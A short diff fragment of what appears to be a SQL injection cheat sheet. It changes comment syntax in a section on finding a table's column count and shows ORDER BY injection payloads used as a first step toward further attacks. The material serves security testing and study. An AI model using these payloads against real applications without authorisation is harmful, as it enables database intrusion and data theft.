@@ -38,9 +38,9 @@ fzappa--+ORDER+BY+1
 Get Number of Columns First (Required for further attacks)
 ----------------------------------------------------------
 ```sql
-# Method 1
-# Increment "number" by 1 and monitor response for different responses or errors.
-# If the error is returned on "'+ORDER+BY+4#" then the table has 3 columns. 
+--  Method 1
+-- Increment "number" by 1 and monitor response for different responses or errors.
+-- If the error is returned on "'+ORDER+BY+4#" then the table has 3 columns. 
 '+ORDER+BY+1#
 '+ORDER+BY+2#
 '+ORDER+BY+3#
